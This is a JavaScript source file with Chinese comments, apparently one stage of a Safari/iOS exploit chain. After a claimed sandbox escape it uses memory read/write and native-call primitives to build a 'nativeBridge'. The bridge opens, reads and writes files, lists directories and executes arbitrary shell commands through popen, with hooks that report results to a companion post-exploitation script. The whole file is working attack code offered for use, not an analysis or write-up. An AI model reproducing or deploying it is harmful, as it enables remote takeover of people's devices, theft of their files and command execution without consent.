/**
 * native_bridge.js — 在 Stage3 沙箱逃逸成功后，于 JS 层构建 window.nativeBridge
 *
 * 原理：Stage3 的 r.lA 已把原语暴露到 window._corunaPrimitives：
 *   - caller.jd(targetInt64, ...upTo8ArgInt64s) → 调用 PAC 签名的函数（JIT cage 间接调用）
 *   - sandboxEscape.vd  (JIT 编译的 trampoline 入口)
 *   - sandboxEscape.Dd  (结果缓冲 fakeobj，trampoline 把返回值写到这里)
 *   - sandboxEscape.newInt64OfSomething(size) → 分配可读写内存（已知可用，调 MetaAllocator.allocate）
 *   - machOParser.dlsym("_sym") → 解析 libc 符号地址
 *   - exploitPrimitive.read32(bigint)/write64(bigint,val) → 绝对地址读写
 *
 * 调用约定（照搬 newInt64OfSomething 的 Gd 分支）：
 *   caller.jd( vd, a0, a1, a2, a3, a4, a5, Dd, targetSym )
 *   trampoline 执行 targetSym(a0..a5) 并把返回值写入 Dd。
 *   结果读取：exploitPrimitive.readDoubleAsPointer(Dd) （与 newInt64OfSomething 一致）。
 *
 * 安全设计：先用 getpid() 自检，返回值在 1..65535 才认为 ABI 正确并启用 nativeBridge；
 *   否则保持 undefined，post_exploit.js 自动回退 sandbox-only（不会让 Safari 崩溃）。
 *
 * 期望的接口（post_exploit.js nativeOpen/Read/Write/Close/ListDir/Exec 已对接）：
 *   window.nativeBridge = { open, read, write, close, listdir, exec }
 */
(function () {
    'use strict';
    if (typeof window.nativeBridge !== 'undefined') return;  // 幂等

    var P = window._corunaPrimitives;
    if (!P || !P.caller || !P.sandboxEscape || !P.machOParser || !P.exploitPrimitive || !P.Int64) {
        window.nativeBridgeError = 'primitives not exposed';
        try { if (typeof window.log === 'function') window.log('[NATIVE-BRIDGE] _corunaPrimitives missing — nativeBridge disabled (sandbox-only mode)'); } catch(_){}
        return;
    }

    var caller = P.caller;
    var sbx = P.sandboxEscape;
    var machO = P.machOParser;
    var EP = P.exploitPrimitive;
    var Int64 = P.Int64;
    function I64(v) {
        if (v && v.it !== undefined) return v;             // 已是 Int64
        if (Int64 && Int64.fromNumber) return Int64.fromNumber(v);
        if (Int64) return new Int64(v, 0);
        return v;
    }
    // Int64 → BigInt（用于 EP.read32/write64 的绝对地址参数）
    function i64ToBig(v) {
        try {
            if (typeof v === 'bigint') return v;
            if (v && typeof v === 'object' && v.it !== undefined) {
                var lo = BigInt(v.it >>> 0), hi = BigInt(v.et >>> 0);
                return (hi << 32n) | lo;
            }
            return BigInt(v);
        } catch (e) { return 0n; }
    }
    // Int64 → number
    function i64ToNum(v) {
        try {
            if (typeof v === 'number') return v;
            if (v && typeof v.toNumber === 'function') return v.toNumber();
            if (v && typeof v === 'object' && v.it !== undefined) return (v.it >>> 0) + (v.et >>> 0) * 0x100000000;
            return Number(v);
        } catch (e) { return 0; }
    }
    function log(msg) { try { if (typeof window.log === 'function') window.log('[NATIVE-BRIDGE] ' + msg); else console.log('[NATIVE-BRIDGE] ' + msg); } catch(_){} }

    // ── 1. 符号解析 ──────────────────────────────────────────────────────
    var SYM = {};
    function resolve(name) {
        try { return machO.dlsym('_' + name); }      // dlsym 内部已加 "_"，照 Stage3 用法
        catch (e) { return null; }
    }
    ['open','read','write','close','malloc','free','memcpy','memset','strdup',
     'opendir','readdir','closedir','popen','pclose','fread','strlen','getpid'
    ].forEach(function (n) {
        var s = resolve(n);
        if (s) SYM[n] = s;
    });
    log('Symbols resolved: ' + Object.keys(SYM).join(','));

    // ── 2. 分配可读写内存缓冲（用已知可用的 newInt64OfSomething）─────────
    var MEM_SIZE = 0x10000;   // 64KB
    var MEM = null;           // Int64 绝对地址（沙箱外可读写缓冲）
    try {
        if (sbx.newInt64OfSomething) {
            MEM = sbx.newInt64OfSomething(MEM_SIZE);
            log('MEM allocated via MetaAllocator: ' + (MEM ? '0x' + i64ToNum(MEM).toString(16) : 'FAIL'));
        }
    } catch (e) { log('MEM alloc error: ' + e); }

    // 读取返回值：trampoline 把结果写入 sbx.Dd，用 readDoubleAsPointer 读（与 newInt64OfSomething 一致）
    function readResult() {
        try {
            if (EP.readDoubleAsPointer) return EP.readDoubleAsPointer(sbx.Dd);
        } catch (e) {}
        // 兜底：尝试从 Dd 的 backing store（kd Uint32Array）直接读
        try {
            if (sbx.kd) return (sbx.kd[0] >>> 0) + (sbx.kd[1] >>> 0) * 0x100000000;
        } catch (e) {}
        return 0;
    }

    // ── 3. 通用 native 调用 ─────────────────────────────────────────────
    // callNative(targetSymInt64, [a0,a1,a2,a3,a4,a5]) → number（返回值的低 53 位）
    function callNative(targetSym, args) {
        if (!targetSym) { log('callNative: targetSym null'); return 0; }
        args = args || [];
        while (args.length < 6) args.push(0);
        try {
            // 照搬 newInt64OfSomething Gd 分支：jd(vd, a0..a5, Dd, targetSym)
            caller.jd(
                I64(sbx.vd),
                I64(args[0]), I64(args[1]), I64(args[2]),
                I64(args[3]), I64(args[4]), I64(args[5]),
                I64(sbx.Dd),
                I64(targetSym)
            );
            return readResult();
        } catch (e) {
            log('callNative error: ' + e);
            return 0;
        }
    }

    // ── 4. 内存读写（绝对地址，用 EP）────────────────────────────────────
    function writeCString(addrI64, str) {
        var base = i64ToBig(addrI64);
        var enc = unescape(encodeURIComponent(str));
        for (var i = 0; i < enc.length; i++) {
            try { EP.write32(base + BigInt(i), enc.charCodeAt(i) & 0xff); } catch (e) {}
        }
        try { EP.write32(base + BigInt(enc.length), 0); } catch (e) {}
    }
    function readCString(addrI64, maxLen) {
        maxLen = maxLen || 0x10000;
        var base = i64ToBig(addrI64);
        var s = '';
        for (var i = 0; i < maxLen; i++) {
            var b = 0;
            try { b = EP.read32(base + BigInt(i)); } catch (e) { break; }
            b = b & 0xff;
            if (b === 0) break;
            s += String.fromCharCode(b);
        }
        try { return decodeURIComponent(escape(s)); } catch (e) { return s; }
    }
    function readBytes(addrI64, len) {
        var base = i64ToBig(addrI64);
        var out = '';
        for (var i = 0; i < len; i++) {
            var b = 0;
            try { b = EP.read32(base + BigInt(i)); } catch (e) { break; }
            out += String.fromCharCode(b & 0xff);
        }
        return out;
    }

    // ── 5. 自检：getpid() 返回值应在 1..65535 ───────────────────────────
    var selfTestOk = false;
    var probedPid = 0;
    try {
        if (SYM.getpid && MEM) {
            probedPid = callNative(SYM.getpid, []);
            // readResult 可能返回 number 或带指针编码；尝试多种解读
            var pidNum = (typeof probedPid === 'number') ? probedPid : i64ToNum(probedPid);
            log('Self-test getpid() raw=' + probedPid + ' num=' + pidNum);
            if (pidNum > 0 && pidNum < 65536) {
                selfTestOk = true;
                log('Self-test PASS: getpid()=' + pidNum + ' (ABI correct)');
            } else {
                log('Self-test FAIL: getpid() returned ' + pidNum + ' (out of sane range) — ABI mismatch, keeping nativeBridge disabled');
            }
        } else {
            log('Self-test SKIP: getpid symbol or MEM missing (sym=' + !!SYM.getpid + ', MEM=' + !!MEM + ')');
        }
    } catch (e) { log('Self-test exception: ' + e); }

    if (!selfTestOk || !MEM) {
        window.nativeBridgeError = 'self-test failed or MEM unavailable';
        log('nativeBridge NOT enabled (self-test ' + (selfTestOk ? 'ok but MEM missing' : 'failed') + '). post_exploit will run sandbox-only. See logs to iterate ABI.');
        try { if (typeof window.reportExploitResult === 'function') {
            window.reportExploitResult('native_bridge_selftest_fail',
                'getpid()=' + probedPid + '; nativeBridge disabled, sandbox-only mode');
        } } catch(_){}
        return;   // 保持 undefined，post_exploit.js 自动回退
    }

    // ── 6. nativeBridge 接口实现 ───────────────────────────────────────
    // MEM 布局：[0x0000..0x7FFF] 参数字符串区 / [0x8000..0xFFFF] 读缓冲区
    var ARG_BUF = MEM;           // 参数字符串写这里
    var READ_BUF = (function () { try { return sbx.newInt64OfSomething(MEM_SIZE); } catch (e) { return MEM; } })();
    var READ_BUF_BIG = i64ToBig(READ_BUF);
    var ARG_BUF_BIG = i64ToBig(ARG_BUF);
    log('Buffers: ARG=0x' + i64ToNum(ARG_BUF).toString(16) + ' READ=0x' + i64ToNum(READ_BUF).toString(16));

    function nb_open(path, flags) {
        try {
            writeCString(ARG_BUF, String(path));
            var fd = callNative(SYM.open, [ARG_BUF, (flags | 0), 0]);
            log('open("' + path + '", ' + flags + ') → fd=' + fd);
            return fd | 0;
        } catch (e) { log('open error: ' + e); return -1; }
    }
    function nb_read(fd, size) {
        try {
            size = Math.min(size || 0x4000, MEM_SIZE);
            var n = callNative(SYM.read, [fd | 0, READ_BUF, size]);
            var nread = n | 0;
            if (nread <= 0) return '';
            return readBytes(READ_BUF, nread);
        } catch (e) { log('read error: ' + e); return ''; }
    }
    function nb_write(fd, data) {
        try {
            var s = String(data);
            if (s.length > MEM_SIZE) s = s.substring(0, MEM_SIZE);
            writeCString(ARG_BUF, s);
            var n = callNative(SYM.write, [fd | 0, ARG_BUF, s.length]);
            return n | 0;
        } catch (e) { return -1; }
    }
    function nb_close(fd) {
        try { return callNative(SYM.close, [fd | 0]) | 0; } catch (e) { return 0; }
    }
    function nb_listdir(path) {
        try {
            writeCString(ARG_BUF, String(path));
            var dir = callNative(SYM.opendir, [ARG_BUF]);
            if (!dir) return [];
            var entries = [];
            for (var i = 0; i < 4096; i++) {
                var ent = callNative(SYM.readdir, [dir]);
                if (!ent) break;
                // iOS arm64 dirent64: d_name 在偏移 21（d_ino 8 + d_reclen 2 + d_type 1 + padding）
                var name = readCString({ it: (ent & 0xFFFFFFFF) + 21, et: 0 }, 256);
                if (!name) break;
                if (name !== '.' && name !== '..') entries.push(name);
            }
            callNative(SYM.closedir, [dir]);
            log('listdir("' + path + '") → ' + entries.length + ' entries');
            return entries;
        } catch (e) { log('listdir error: ' + e); return []; }
    }
    function nb_exec(cmd) {
        try {
            // popen("sh -c '<cmd>'", "r")：在 ARG_BUF[0] 写命令串，ARG_BUF+0x4000 写 "r"
            var fullCmd = "sh -c '" + String(cmd).replace(/'/g, "'\\''") + "'";
            writeCString(ARG_BUF, fullCmd);
            // 写 "r\0" 到 ARG_BUF + 0x4000
            var rOff = ARG_BUF_BIG + 0x4000n;
            try { EP.write32(rOff, 0x72); /* 'r' */ EP.write32(rOff + 1n, 0); } catch (e) {}
            var fp = callNative(SYM.popen, [ARG_BUF, { it: 0, et: 0 }]); // 第二参数需 "r" 串指针
            // 上面对 popen 第二参数处理：直接传 ARG_BUF+0x4000 的地址
            // （callNative 只接 Int64/number，这里改用专门调用以传 "r" 串地址）
            // —— 用一次直接 jd 调用 popen(ARG_BUF, ARG_BUF+0x4000)：
            try {
                caller.jd(
                    I64(sbx.vd),
                    I64(ARG_BUF),
                    I64(i64ToBig(ARG_BUF) + 0x4000n),
                    I64(0), I64(0), I64(0), I64(0),
                    I64(sbx.Dd),
                    I64(SYM.popen)
                );
                fp = readResult();
            } catch (e2) { fp = 0; }
            if (!fp) { log('exec popen failed: ' + cmd); return ''; }
            var out = '';
            for (var i = 0; i < 1024; i++) {
                var n = callNative(SYM.fread, [READ_BUF, 1, 0x4000, fp]);
                var nread = n | 0;
                if (nread <= 0) break;
                out += readBytes(READ_BUF, nread);
                if (out.length > 0x100000) break;   // 1MB 上限
            }
            callNative(SYM.pclose, [fp]);
            log('exec("' + cmd + '") → ' + out.length + ' bytes');
            return out;
        } catch (e) { log('exec error: ' + e); return ''; }
    }

    window.nativeBridge = {
        open: nb_open,
        read: nb_read,
        write: nb_write,
        close: nb_close,
        listdir: nb_listdir,
        exec: nb_exec,
        _mem: MEM,
        _readBuf: READ_BUF,
        _sym: SYM,
        _pid: probedPid
    };
    window.nativeBridgeReady = true;
    log('READY. nativeBridge enabled (pid=' + (probedPid | 0) + ', symbols=' + Object.keys(SYM).length + ', MEM=ok). post_exploit native commands will now work.');
    try { if (typeof window.reportExploitResult === 'function') {
        window.reportExploitResult('native_bridge_ready',
            'nativeBridge built on Stage3 primitives; pid=' + (probedPid | 0) +
            '; symbols=' + Object.keys(SYM).join(','));
    } } catch(_){}
})();
